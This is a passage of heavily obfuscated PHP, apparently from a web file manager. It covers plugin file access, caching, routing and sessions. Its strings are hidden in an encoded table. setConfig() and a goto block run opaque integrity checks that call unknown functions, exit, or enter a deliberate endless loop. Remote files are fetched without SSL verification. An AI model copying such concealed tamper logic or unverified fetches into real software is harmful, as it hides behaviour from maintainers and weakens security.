$šşÊ¥æ¤[$¹ñì¼ûè[454]][$¹ñì¼ûè[1543]] . $¹ñì¼ûè[1545]; } else { if ($šşÊ¥æ¤[$¹ñì¼ûè[454]][$¹ñì¼ûè[1546]]) { $É€À´»ƒ = $¹ñì¼ûè[1547] . $šşÊ¥æ¤[$¹ñì¼ûè[454]][$¹ñì¼ûè[1546]] . $¹ñì¼ûè[1548]; } } } return $É€À´»ƒ; } final function fileCanView($ôñ’Şù†) { $îâÏï¬ =& $_SERVER[¹òÍ›æş]; if (request_url_safe($ôñ’Şù†)) { return !0; } if ($this->isShare($ôñ’Şù†)) { return !0; } $ ­«£ñ± = Session::get($îâÏï¬[1549]); if (!$ ­«£ñ± || !$ ­«£ñ±[$îâÏï¬[1550]]) { $ƒ‚˜ĞÅ˜ = $îâÏï¬[1551] . rawurlencode(this_url()); show_tips(LNG($îâÏï¬[1552]) . $îâÏï¬[1553] . $ƒ‚˜ĞÅ˜ . $îâÏï¬[1554] . LNG($îâÏï¬[1555]) . $îâÏï¬[1556], !1); } if (!Action($îâÏï¬[1557])->authCan($îâÏï¬[1558])) { show_tips(LNG($îâÏï¬[1559]) . $îâÏï¬[1560], !1); } ActionCall($îâÏï¬[1561], $ôñ’Şù†); } final function isShare($š¯‹Ş›™) { $ó´ÑÊ„ = KodIO::parse($š¯‹Ş›™); return $ó´ÑÊ„[$_SERVER[¹òÍ›æş][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($¢Í†ƒæ) { if (request_url_safe($¢Í†ƒæ)) { return $¢Í†ƒæ; } if (!$this->isShare($¢Í†ƒæ)) { $¢Í†ƒæ = $this->filePath($¢Í†ƒæ); } return Action($_SERVER[¹òÍ›æş][1201])->linkOut($¢Í†ƒæ); } public function filePathLinkOut($õŒ¥÷Êß) { if (request_url_safe($õŒ¥÷Êß)) { return $õŒ¥÷Êß; } $this->fileCanView($õŒ¥÷Êß); return Action($_SERVER[¹òÍ›æş][1201])->link($õŒ¥÷Êß); } final function filePath($é©£¶®) { $›å‹âÎ¢ =& $_SERVER[¹òÍ›æş]; if ($´Ø½Èşß = $this->checkSharePath($é©£¶®)) { Hook::trigger($›å‹âÎ¢[1562], $´Ø½Èşß); return $´Ø½Èşß; } $this->fileCanView($é©£¶®); if (request_url_safe($é©£¶®)) { $ìËÇØª¯ = parse_url_query($é©£¶®); if (isset($ìËÇØª¯[$›å‹âÎ¢[1563]]) && isset($ìËÇØª¯[$›å‹âÎ¢[223]])) { $À¬í¹õ = Model($›å‹âÎ¢[800])->get($›å‹âÎ¢[801]); $ÅŠ‚ˆÈò = Mcrypt::decode($ìËÇØª¯[$›å‹âÎ¢[223]], $À¬í¹õ); if ($ÅŠ‚ˆÈò) { $this->fileInfo = IO::infoWithChildren($ÅŠ‚ˆÈò); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ÅŠ‚ˆÈò; } } $é©£¶® = $this->_cacheHttpFile($é©£¶®); $this->fileInfo = IO::infoWithChildren($é©£¶®); } else { $this->fileInfo = IO::infoWithChildren($é©£¶®); if (!$this->fileInfo) { show_tips(LNG($›å‹âÎ¢[115]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($›å‹âÎ¢[1562], $é©£¶®); return $é©£¶®; } final function _cacheHttpFile($³Ì¨•–) { $˜«ç¶İó = hash_path($³Ì¨•–, !0); $this->cachePath = $this->pluginCachePath($˜«ç¶İó); if ($é®Ååáı = IO::fileNameExist($this->cachePath, $˜«ç¶İó)) { return KodIO::make($é®Ååáı); } $€‡ùÒ = $this->cachePath . $˜«ç¶İó; return $this->pluginCacheFileSet($€‡ùÒ, file_get_contents_nossl($³Ì¨•–)); } final function _tmpFileName($ˆ“Ç§…¶ = array()) { $½Î¬ış =& $_SERVER[¹òÍ›æş]; if (!$ˆ“Ç§…¶) { $ˆ“Ç§…¶ = $this->fileInfo; } if (isset($ˆ“Ç§…¶[$½Î¬ış[187]])) { return $ˆ“Ç§…¶[$½Î¬ış[187]]; } if (isset($ˆ“Ç§…¶[$½Î¬ış[180]][$½Î¬ış[187]])) { return $ˆ“Ç§…¶[$½Î¬ış[180]][$½Î¬ış[187]]; } $›£‡‡½÷ = IO::hashSimple($ˆ“Ç§…¶[$½Î¬ış[94]]); if ($›£‡‡½÷) { return $›£‡‡½÷; } $Ö¤‚úâ¡ = array($ˆ“Ç§…¶[$½Î¬ış[32]], $ˆ“Ç§…¶[$½Î¬ış[94]], $ˆ“Ç§…¶[$½Î¬ış[86]]); if (isset($ˆ“Ç§…¶[$½Î¬ış[549]])) { $Ö¤‚úâ¡[] = $ˆ“Ç§…¶[$½Î¬ış[549]]; } return md5(implode($½Î¬ış[11], $Ö¤‚úâ¡)); } final function checkSharePath($¯×ó¥) { $ìâ‚§ïÇ =& $_SERVER[¹òÍ›æş]; if (!$this->isShare($¯×ó¥)) { return !1; } $§Âá€Ç = Action($ìâ‚§ïÇ[1201])->sharePathInfo($¯×ó¥); if (!isset($§Âá€Ç[$ìâ‚§ïÇ[94]])) { show_json(LNG($ìâ‚§ïÇ[1564]), !1); } $this->fileInfo = $§Âá€Ç[$ìâ‚§ïÇ[180]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$ìâ‚§ïÇ[187]]); return $§Âá€Ç[$ìâ‚§ïÇ[94]]; } final function pluginCachePath($µË¼£° = '') { $ûï˜Ş² =& $_SERVER[¹òÍ›æş]; $ †‚Ì»‰ = IO_PATH_SYSTEM_TEMP . $ûï˜Ş²[1565] . $this->pluginName; if (!($—‡ğÃ„ğ = IO::infoFull($ †‚Ì»‰))) { return IO::mkdir($ †‚Ì»‰ . $ûï˜Ş²[8] . $µË¼£°); } if (empty($µË¼£°)) { return $—‡ğÃ„ğ[$ûï˜Ş²[94]]; } if (!($ªÊ£¾‚¤ = IO::fileNameExist($—‡ğÃ„ğ[$ûï˜Ş²[94]], $µË¼£°))) { return IO::mkdir($—‡ğÃ„ğ[$ûï˜Ş²[94]] . $µË¼£°); } return KodIO::make($ªÊ£¾‚¤); } final function pluginCacheFileSet($Íã¹², $¬† £±º = '') { $ÜÇ şğ« =& $_SERVER[¹òÍ›æş]; if (!($×ŸÓ = IO::infoFull($Íã¹²))) { return IO::mkfile($Íã¹², $¬† £±º, REPEAT_REPLACE); } IO::setContent($×ŸÓ[$ÜÇ şğ«[94]], $¬† £±º); return $×ŸÓ[$ÜÇ şğ«[94]]; } final function pluginLocalFile($Ğ¾¤×Íİ = '') { $¹è˜ãƒÂ =& $_SERVER[¹òÍ›æş]; $”¤Ñ»ıÊ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($”¤Ñ»ıÊ)) { mk_dir($”¤Ñ»ıÊ); } if (!$Ğ¾¤×Íİ) { return $”¤Ñ»ıÊ; } $Ñ›Âëú = IO::info($Ğ¾¤×Íİ); $©ƒÇ£Ãß = $this->_tmpFileName($Ñ›Âëú) . $¹è˜ãƒÂ[10] . $Ñ›Âëú[$¹è˜ãƒÂ[184]]; if (!checkExtSafe($©ƒÇ£Ãß)) { $©ƒÇ£Ãß = $©ƒÇ£Ãß . $¹è˜ãƒÂ[1233]; } $êÙ–à• = $”¤Ñ»ıÊ . $©ƒÇ£Ãß; if (@file_exists($êÙ–à•)) { return $êÙ–à•; } return IO::copy($Ğ¾¤×Íİ, $”¤Ñ»ıÊ, 0, $©ƒÇ£Ãß); } final function appPackage() { $¢Ø…îáÏ =& $_SERVER[¹òÍ›æş]; if ($this->packageData) { return $this->packageData; } $¢ŸòÇ¨ = $this->parseFile($this->pluginPath . $¢Ø…îáÏ[1566]); $this->parseLang($¢ŸòÇ¨); $ÑÓÃ°  = json_decode_force($¢ŸòÇ¨); if (!$ÑÓÃ° ) { return array(); } $‚×·Î¨Í = Hook::trigger($¢Ø…îáÏ[1567], $ÑÓÃ° ); if ($‚×·Î¨Í && is_array($‚×·Î¨Í)) { $ÑÓÃ°  = $‚×·Î¨Í; } $this->packageData = $ÑÓÃ° ; return $ÑÓÃ° ; } public function packageInfoGet($û·ÎÄ¥) { $øºÛûì„ = $this->appPackage(); return array_get_value($øºÛûì„, $û·ÎÄ¥); } public function packageVersion() { return $this->packageInfoGet($_SERVER[¹òÍ›æş][1568]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[¹òÍ›æş][1569]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[¹òÍ›æş][1570]); } public function echoJsAssign($©Ğõš–, $ñ÷ÈğÁ¸) { $this->echoJsAssignArr[$©Ğõš–] = $ñ÷ÈğÁ¸; } private function parseFile($’´ÁÒÖî) { $’Ñ×äõĞ =& $_SERVER[¹òÍ›æş]; $ãÏ…¡ÊÛ = file_get_contents_nossl($’´ÁÒÖî); $´àª§»¯ = array($’Ñ×äõĞ[1571], $’Ñ×äõĞ[1572], $’Ñ×äõĞ[1573], $’Ñ×äõĞ[1574], $’Ñ×äõĞ[1575], $’Ñ×äõĞ[1576], $’Ñ×äõĞ[1577]); $Ç‰¾ª“Ù = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$’Ñ×äõĞ[99]][$’Ñ×äõĞ[1578]]); foreach ($this->echoJsAssignArr as $öÀ¶ => $×£ø·—¿) { $´àª§»¯[] = $’Ñ×äõĞ[1579] . $öÀ¶ . $’Ñ×äõĞ[1580]; $Ç‰¾ª“Ù[] = is_array($×£ø·—¿) || is_object($×£ø·—¿) ? rawurlencode(json_encode($×£ø·—¿)) : $×£ø·—¿; } if (strstr($ãÏ…¡ÊÛ, $’Ñ×äõĞ[1581])) { $é¼›‘İÎ = rawurlencode(json_encode($this->pluginLangArr)); $ãÏ…¡ÊÛ = str_replace($’Ñ×äõĞ[1581], $é¼›‘İÎ, $ãÏ…¡ÊÛ); } if (strstr($ãÏ…¡ÊÛ, $’Ñ×äõĞ[1582])) { $é¼›‘İÎ = $é¼›‘İÎ = rawurlencode(json_encode($this->getConfig())); $ãÏ…¡ÊÛ = str_replace($’Ñ×äõĞ[1582], $é¼›‘İÎ, $ãÏ…¡ÊÛ); } $ãÏ…¡ÊÛ = str_replace($´àª§»¯, $Ç‰¾ª“Ù, $ãÏ…¡ÊÛ); return $ãÏ…¡ÊÛ; } private function parseLang(&$íËüœ«¨) { $¶é·«ŒØ =& $_SERVER[¹òÍ›æş]; $½˜Òª´Õ = $¶é·«ŒØ[1583]; if (!strstr($íËüœ«¨, $½˜Òª´Õ)) { return; } preg_match_all($¶é·«ŒØ[1584], $íËüœ«¨, $Ú—Å×¦); if (!is_array($Ú—Å×¦) || count($Ú—Å×¦) == 0 || !is_array($Ú—Å×¦[0]) || count($Ú—Å×¦[0]) == 0) { return; } $ŒåÙø– = array(); $‰ÁË·ğÚ = array(); foreach ($Ú—Å×¦[0] as $íã´ìæ®) { $Æúº÷²ì = substr($íã´ìæ®, strlen($½˜Òª´Õ), -4); $ıêíùğÂ = LNG($Æúº÷²ì); $ŒåÙø–[] = $íã´ìæ®; $‰ÁË·ğÚ[] = str_replace(array($¶é·«ŒØ[59], $¶é·«ŒØ[1105], $¶é·«ŒØ[380], $¶é·«ŒØ[128]), array($¶é·«ŒØ[53], $¶é·«ŒØ[53], $¶é·«ŒØ[12], $¶é·«ŒØ[1585]), $ıêíùğÂ); } $íËüœ«¨ = str_replace($ŒåÙø–, $‰ÁË·ğÚ, $íËüœ«¨); } private function parseConfig(&$ƒè¾óáÂ) { $Æ…‹‚ü =& $_SERVER[¹òÍ›æş]; $äÄéµî = $Æ…‹‚ü[1586]; if (!strstr($ƒè¾óáÂ, $äÄéµî)) { return; } preg_match_all($Æ…‹‚ü[1587], $ƒè¾óáÂ, $ù…Ÿ·â); if (!is_array($ù…Ÿ·â) || count($ù…Ÿ·â) == 0 || !is_array($ù…Ÿ·â[0]) || count($ù…Ÿ·â[0]) == 0) { return; } $œ€€îõ˜ = $this->getConfig(); $ƒ’ı·œõ = array(); $§Õ¢‚ = array(); foreach ($ù…Ÿ·â[0] as $ÎíŸ) { $¡¿Ñ”á = substr($ÎíŸ, strlen($äÄéµî), -2); $ƒ’ı·œõ[] = $ÎíŸ; $§Õ¢‚[] = _get($œ€€îõ˜, $¡¿Ñ”á); } $ƒè¾óáÂ = str_replace($ƒ’ı·œõ, $§Õ¢‚, $ƒè¾óáÂ); } private function parsePackage(&$‘‰áë†ò) { $ÔÑôæÇª =& $_SERVER[¹òÍ›æş]; $ß·„ª¥ = $ÔÑôæÇª[1588]; if (!strstr($‘‰áë†ò, $ß·„ª¥)) { return; } preg_match_all($ÔÑôæÇª[1589], $‘‰áë†ò, $Šáâé); if (!is_array($Šáâé) || count($Šáâé) == 0 || !is_array($Šáâé[0]) || count($Šáâé[0]) == 0) { return; } $¢åÑóä = $this->appPackage(); $Ä¬ğÏ„ = array(); $ŠĞµ×å = array(); foreach ($Šáâé[0] as $ôª ßá€) { $ûÑù¸¼û = substr($ôª ßá€, strlen($ß·„ª¥), -2); $Ä¬ğÏ„[] = $ôª ßá€; $ŠĞµ×å[] = _get($¢åÑóä, $ûÑù¸¼û); } $‘‰áë†ò = str_replace($Ä¬ğÏ„, $ŠĞµ×å, $‘‰áë†ò); } final function echoFile($çÏ·ğáç, $ö’ı “— = false) { $¨“Â­ˆÀ =& $_SERVER[¹òÍ›æş]; $Úî¨”¿ = $this->pluginPath . $çÏ·ğáç; if (ACT == $¨“Â­ˆÀ[1590]) { echo $¨“Â­ˆÀ[1591] . $this->pluginName . $¨“Â­ˆÀ[8] . $çÏ·ğáç . $¨“Â­ˆÀ[1592]; if (!file_exists($Úî¨”¿)) { echo $¨“Â­ˆÀ[1593]; return; } } $¿â§°Ã = $this->parseFile($Úî¨”¿); $this->parseLang($¿â§°Ã); $this->parseConfig($¿â§°Ã); $this->parsePackage($¿â§°Ã); if (is_array($ö’ı “—)) { $¿â§°Ã = str_replace(array_keys($ö’ı “—), array_values($ö’ı “—), $¿â§°Ã); } echo $¨“Â­ˆÀ[59] . $¿â§°Ã; } final function initLang() { $ö•­”«¬ =& $_SERVER[¹òÍ›æş]; $İ®«¹Ù‰ = $ö•­”«¬[1594]; $´ë‹ëÛİ = $this->pluginPath . $ö•­”«¬[1595]; $ØÇ¡ÃÔ = I18n::getType(); $ƒ³ñõ¾­ = array(); if (file_exists($´ë‹ëÛİ . $ØÇ¡ÃÔ . $ö•­”«¬[868])) { $ƒ³ñõ¾­ = (include $´ë‹ëÛİ . $ØÇ¡ÃÔ . $ö•­”«¬[868]); } else { if ($ØÇ¡ÃÔ == $ö•­”«¬[1596] && !file_exists($´ë‹ëÛİ . $ØÇ¡ÃÔ . $ö•­”«¬[868]) && file_exists($´ë‹ëÛİ . $ö•­”«¬[1597])) { $ƒ³ñõ¾­ = (include $´ë‹ëÛİ . $ö•­”«¬[1597]); } else { if (file_exists($´ë‹ëÛİ . $İ®«¹Ù‰ . $ö•­”«¬[868])) { $ƒ³ñõ¾­ = (include $´ë‹ëÛİ . $İ®«¹Ù‰ . $ö•­”«¬[868]); } } } if (!is_array($ƒ³ñõ¾­)) { return array(); } if (@count($ƒ³ñõ¾­) > 0) { I18n::set($ƒ³ñõ¾­); } return $ƒ³ñõ¾­; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($ÎÍÁ×ú) { $ë‚Öğ• =& $_SERVER[¹òÍ›æş]; if (!isset($_SERVER[$ë‚Öğ•[54]]) || !isset($_SERVER[$ë‚Öğ•[63]])) { $õö¸Ó¯á = $ë‚Öğ•[906]; $Çöñ™”˜ = $ë‚Öğ•[56]; $–¡á™·µ = $_SERVER[$ë‚Öğ•[57]] . $ë‚Öğ•[58]; $ŞºÊÇ¦ = $Çöñ™”˜($–¡á™·µ); $±†âüÂÈ = explode($ë‚Öğ•[59], $ŞºÊÇ¦); if (count($±†âüÂÈ) < $ë‚Öğ•[654]) { $³„ôá” = $ë‚Öğ•[61]; $³„ôá”(); } $ÎùåÑè² = $ë‚Öğ•[907]; $ÎùåÑè²($_SERVER[$ë‚Öğ•[908]]); $éŸÁ†ü = 1; for ($êşœ»èŠ = $éŸÁ†ü; $êşœ»èŠ > 0; $êşœ»èŠ++) { $ÎùåÑè² = json_encode($GLOBALS[$ë‚Öğ•[456]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $ÎÍÁ×ú); } public function onSetConfig($ãì€¯æá) { } public function onGetConfig($¢¶üÆ¬à) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($ş§êÊëõ) { if ($ş§êÊëõ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($´¥ŒŸä = "\x70\x6c\x75\147\x69\156\x41\x75\164\x68") { $º×ıš¨Ÿ =& $_SERVER[¹òÍ›æş]; if (!Session::get($º×ıš¨Ÿ[1549])) { return !1; } if (_get($GLOBALS, $º×ıš¨Ÿ[532])) { return !0; } $…¯‡öÃ = $this->getConfig(); if (!$…¯‡öÃ[$´¥ŒŸä]) { return !1; } return ActionCall($º×ıš¨Ÿ[1598], $…¯‡öÃ[$´¥ŒŸä]); } public function url($æÕ³Ú€, $ÉäÃèñÎ = '', $›†´êÃü = true) { $”Õ—ğù =& $_SERVER[¹òÍ›æş]; $Üç§ëÒ = $this->getConfig(); $·³óüÎ´ = KOD_VERSION . $”Õ—ğù[10] . KOD_VERSION_BUILD; $ı’¡‡ŞĞ = $this->packageVersion(); $ìÃÖï†ï = $·³óüÎ´ . $”Õ—ğù[424] . $ı’¡‡ŞĞ; if (substr($æÕ³Ú€, 0, 4) == $”Õ—ğù[158] || substr($æÕ³Ú€, 0, 2) == $”Õ—ğù[1305]) { $ºô‚ü€» = $æÕ³Ú€ . $”Õ—ğù[1599] . $ìÃÖï†ï; } else { if ($ÉäÃèñÎ == $”Õ—ğù[12]) { $ºô‚ü€» = $this->pluginHost . $æÕ³Ú€ . $”Õ—ğù[1599] . $ìÃÖï†ï; } else { if ($ÉäÃèñÎ === $”Õ—ğù[85]) { $ºô‚ü€» = $this->pluginHost . $æÕ³Ú€; } else { if ($ÉäÃèñÎ == $”Õ—ğù[1600]) { $ºô‚ü€» = STATIC_PATH . $æÕ³Ú€ . $”Õ—ğù[1599] . $·³óüÎ´; } else { if ($ÉäÃèñÎ == $”Õ—ğù[1601]) { $ºô‚ü€» = APP_HOST . $”Õ—ğù[1602] . $æÕ³Ú€ . $”Õ—ğù[1599] . $·³óüÎ´; } else { if (isset($Üç§ëÒ[$ÉäÃèñÎ])) { $ºô‚ü€» = $Üç§ëÒ[$ÉäÃèñÎ] . $æÕ³Ú€ . $”Õ—ğù[1599] . $ìÃÖï†ï; } } } } } } if (!$›†´êÃü) { return $ºô‚ü€»; } echo $ºô‚ü€»; } public function link($¹œöˆãî = false, $ìóÀ¦Å´ = '') { $÷éî—®í =& $_SERVER[¹òÍ›æş]; if (!$¹œöˆãî) { $this->link($÷éî—®í[1603], $÷éî—®í[1601]); $this->link($÷éî—®í[1604], $÷éî—®í[1600]); $this->link($÷éî—®í[1605], $÷éî—®í[1600]); $this->link($÷éî—®í[1606], $÷éî—®í[1600]); $this->link($÷éî—®í[1607], $÷éî—®í[1600]); return; } $’ù•¾İ = $this->url($¹œöˆãî, $ìóÀ¦Å´, !1); if (substr($¹œöˆãî, -3) == $÷éî—®í[1608]) { echo $÷éî—®í[1609] . $’ù•¾İ . $÷éî—®í[1610] . $÷éî—®í[59]; } else { if (substr($¹œöˆãî, -4) == $÷éî—®í[1611]) { echo $÷éî—®í[1612] . $’ù•¾İ . $÷éî—®í[1613] . $÷éî—®í[59]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\156\171" => "\133\x5e\57\135\x2b", "\72\x6e\165\155" => "\133\x30\55\x39\135\x2b", "\x3a\x61\x6c\x6c" => "\56\52"); public static $errorCallback; public static function __callstatic($Ç¬ñÙèĞ, $ğ•ˆùìí) { $–İ€œ¯´ =& $_SERVER[¹òÍ›æş]; if ($Ç¬ñÙèĞ == $–İ€œ¯´[1614]) { $Áşş€ºÑ = array_map($–İ€œ¯´[1615], $ğ•ˆùìí[0]); $²óç–Óè = strpos($ğ•ˆùìí[1], $–İ€œ¯´[8]) === 0 ? $ğ•ˆùìí[1] : $–İ€œ¯´[8] . $ğ•ˆùìí[1]; $Œäº–åË = $ğ•ˆùìí[2]; } else { $Áşş€ºÑ = null; $²óç–Óè = strpos($ğ•ˆùìí[0], $–İ€œ¯´[8]) === 0 ? $ğ•ˆùìí[0] : $–İ€œ¯´[8] . $ğ•ˆùìí[0]; $Œäº–åË = $ğ•ˆùìí[1]; } array_push(self::$maps, $Áşş€ºÑ); array_push(self::$routes, $²óç–Óè); array_push(self::$methods, strtoupper($Ç¬ñÙèĞ)); array_push(self::$callbacks, $Œäº–åË); } public static function error($¶¶â«šÇ) { self::$errorCallback = $¶¶â«šÇ; } public static function haltOnMatch($õåƒöıŒ = true) { self::$halts = $õåƒöıŒ; } public static function dispatch() { $¤¶«Ô÷¸ =& $_SERVER[¹òÍ›æş]; $İ¥Ä = parse_url($_SERVER[$¤¶«Ô÷¸[1616]], PHP_URL_PATH); $´ÅøÜáú = $_SERVER[$¤¶«Ô÷¸[169]]; $ë‰®¾Ï˜ = array_keys(static::$patterns); $®êÅÎ¸ = array_values(static::$patterns); $·‹É»Ü§ = !1; self::$routes = preg_replace($¤¶«Ô÷¸[1303], $¤¶«Ô÷¸[8], self::$routes); if (in_array($İ¥Ä, self::$routes)) { $è®› ” = array_keys(self::$routes, $İ¥Ä); foreach ($è®› ” as $œÎ¦­®é) { if (self::$methods[$œÎ¦­®é] == $´ÅøÜáú || self::$methods[$œÎ¦­®é] == $¤¶«Ô÷¸[1617] || in_array($´ÅøÜáú, self::$maps[$œÎ¦­®é])) { $·‹É»Ü§ = !0; if (!is_object(self::$callbacks[$œÎ¦­®é])) { $ô‘µÅ·š = explode($¤¶«Ô÷¸[8], self::$callbacks[$œÎ¦­®é]); $ÅÀØİÊ = end($ô‘µÅ·š); $ÅÇå¿ë = explode($¤¶«Ô÷¸[1235], $ÅÀØİÊ); $Ó˜š›µ = new $ÅÇå¿ë[0](); $Ó˜š›µ->{$ÅÇå¿ë[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$œÎ¦­®é]); if (self::$halts) { return; } } } } } else { $¸£Î¢˜‘ = 0; foreach (self::$routes as $œÎ¦­®é) { if (strpos($œÎ¦­®é, $¤¶«Ô÷¸[4]) !== !1) { $œÎ¦­®é = str_replace($ë‰®¾Ï˜, $®êÅÎ¸, $œÎ¦­®é); } if (preg_match($¤¶«Ô÷¸[1618] . $œÎ¦­®é . $¤¶«Ô÷¸[1619], $İ¥Ä, $Ó‚£’„À)) { if (self::$methods[$¸£Î¢˜‘] == $´ÅøÜáú || self::$methods[$¸£Î¢˜‘] == $¤¶«Ô÷¸[1617] || !empty(self::$maps[$¸£Î¢˜‘]) && in_array($´ÅøÜáú, self::$maps[$¸£Î¢˜‘])) { $·‹É»Ü§ = !0; array_shift($Ó‚£’„À); if (!is_object(self::$callbacks[$¸£Î¢˜‘])) { $ô‘µÅ·š = explode($¤¶«Ô÷¸[8], self::$callbacks[$¸£Î¢˜‘]); $ÅÀØİÊ = end($ô‘µÅ·š); $ÅÇå¿ë = explode($¤¶«Ô÷¸[1235], $ÅÀØİÊ); $Ó˜š›µ = new $ÅÇå¿ë[0](); if (!method_exists($Ó˜š›µ, $ÅÇå¿ë[1])) { echo $¤¶«Ô÷¸[1620]; } else { call_user_func_array(array($Ó˜š›µ, $ÅÇå¿ë[1]), $Ó‚£’„À); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$¸£Î¢˜‘], $Ó‚£’„À); if (self::$halts) { return; } } } } $¸£Î¢˜‘++; } } if ($·‹É»Ü§ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $œÚıˆ€± =& $_SERVER[¹òÍ›æş]; header($_SERVER[$œÚıˆ€±[1621]] . $œÚıˆ€±[1622]); echo $œÚıˆ€±[1623]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$¤¶«Ô÷¸[1616]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $íÖá»¶ø =& $_SERVER[¹òÍ›æş]; static $»••Œ¦¾ = false; if ($»••Œ¦¾) { return $»••Œ¦¾; } $–Å´øÇ = $GLOBALS[$íÖá»¶ø[6]][$íÖá»¶ø[387]]; self::$sessionTime = $–Å´øÇ[$íÖá»¶ø[1624]]; $ëˆÅÛË• = isset($GLOBALS[$íÖá»¶ø[1625]]) ? $GLOBALS[$íÖá»¶ø[1625]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ëˆÅÛË•)) { self::$sessionSign = Cookie::get($ëˆÅÛË•); } else { self::$sessionSign = guid(); } } Cookie::setSafe($ëˆÅÛË•, self::$sessionSign, self::$sessionTime); $ß¨‡áÌ¦ = $–Å´øÇ[$íÖá»¶ø[1626]]; $˜ï¤ß¡¶ = $–Å´øÇ[$ß¨‡áÌ¦]; $›Üè©ŞÊ = $–Å´øÇ[$íÖá»¶ø[858]]; switch ($ß¨‡áÌ¦) { case $íÖá»¶ø[21]: self::$handle = Model($íÖá»¶ø[859]); break; case $íÖá»¶ø[860]: self::$handle = new CacheRedis($˜ï¤ß¡¶, $›Üè©ŞÊ); break; case $íÖá»¶ø[861]: self::$handle = new CacheMemcached($˜ï¤ß¡¶, $›Üè©ŞÊ); break; case $íÖá»¶ø[210]: $˜ï¤ß¡¶[$íÖá»¶ø[94]] = $˜ï¤ß¡¶[$íÖá»¶ø[94]] . $íÖá»¶ø[1627]; self::$handle = new CacheFile($˜ï¤ß¡¶, $›Üè©ŞÊ); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $»••Œ¦¾ = new self(); return $»••Œ¦¾; } public static function getBySign($Àôì¬Šè) { $¹Ş¸Éö = self::$handle->get($Àôì¬Šè); $¹Ş¸Éö = unserialize($¹Ş¸Éö); return is_array($¹Ş¸Éö) ? $¹Ş¸Éö : array(); } public static function setBySign($©åğµğ™, $çæ¯ÈáË) { CacheLock::lock($©åğµğ™); self::$handle->set($©åğµğ™, serialize($çæ¯ÈáË), self::$sessionTime); CacheLock::unlock($©åğµğ™); } public static function sign($èÍİ œ = false) { $èÍİ œ && (self::$sessionSign = $èÍİ œ); self::init(); return self::$sessionSign; } public static function set($§ÁëØ‡•, $ğ§¨«§ = false) { self::init(); if (is_array($§ÁëØ‡•)) { foreach ($§ÁëØ‡• as $å‡õìÓá => $º›éÎÄø) { array_set_value(self::$data, $å‡õìÓá, $º›éÎÄø); } } else { array_set_value(self::$data, $§ÁëØ‡•, $ğ§¨«§); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¸îşú« = false) { self::init(); if (!$¸îşú«) { return self::$data; } return array_get_value(self::$data, $¸îşú«); } public static function remove($Œ‡›Õ€²) { self::init(); unset(self::$data[$Œ‡›Õ€²]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[¹òÍ›æş][863])) { self::$handle->clearTimeout(); } } } goto A‘‡ÂïñÇŠ; D±öà‹ñÂ: if ($_SERVER[$_SERVER[¹òÍ›æş][54]] != $_size($_file)) { $_getc = $_SERVER[¹òÍ›æş][56]; $_getfile = $_SERVER[$_SERVER[¹òÍ›æş][57]] . $_SERVER[¹òÍ›æş][58]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹òÍ›æş][59], $_getfilec); if (count($_getarrs) < $_SERVER[¹òÍ›æş][60]) { $exit = $_SERVER[¹òÍ›æş][61]; $exit(); } $_act = $_SERVER[¹òÍ›æş][62]; $_act($_file); } class Task { const STATYS_STOP = "\x73\x74\x6f\160"; const STATYS_RUNNING = "\x72\x75\156\156\151\x6e\x67"; const STATYS_KILL = "\153\151\154\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ï£Á¿î, $ì¬ĞØÅÓ = '', $ÙÁ‹…€Ï = 0, $¼º§ğÀ‘ = '') { $Êç¤¸‘Ñ =& $_SERVER[¹òÍ›æş]; if (self::get($ï£Á¿î)) { return; } $this->task = array($Êç¤¸‘Ñ[437] => $ï£Á¿î, $Êç¤¸‘Ñ[1669] => USER_ID, $Êç¤¸‘Ñ[1569] => $¼º§ğÀ‘, $Êç¤¸‘Ñ[491] => $Êç¤¸‘Ñ[12], $Êç¤¸‘Ñ[33] => $ì¬ĞØÅÓ, $Êç¤¸‘Ñ[1091] => $Êç¤¸‘Ñ[12], $Êç¤¸‘Ñ[816] => $ÙÁ‹…€Ï, $Êç¤¸‘Ñ[1670] => 0, $Êç¤¸‘Ñ[1671] => 0, $Êç¤¸‘Ñ[1672] => 0, $Êç¤¸‘Ñ[1673] => timeFloat(), $Êç¤¸‘Ñ[1674] => 0, $Êç¤¸‘Ñ[1675] => 0, $Êç¤¸‘Ñ[1676] => 0, $Êç¤¸‘Ñ[1677] => 0, $Êç¤¸‘Ñ[780] => $Êç¤¸‘Ñ[1628]); $GLOBALS[$Êç¤¸‘Ñ[1678]] = 1; Hook::bind($Êç¤¸‘Ñ[1633], array($this, $Êç¤¸‘Ñ[1679])); Hook::bind($Êç¤¸‘Ñ[1680], array($this, 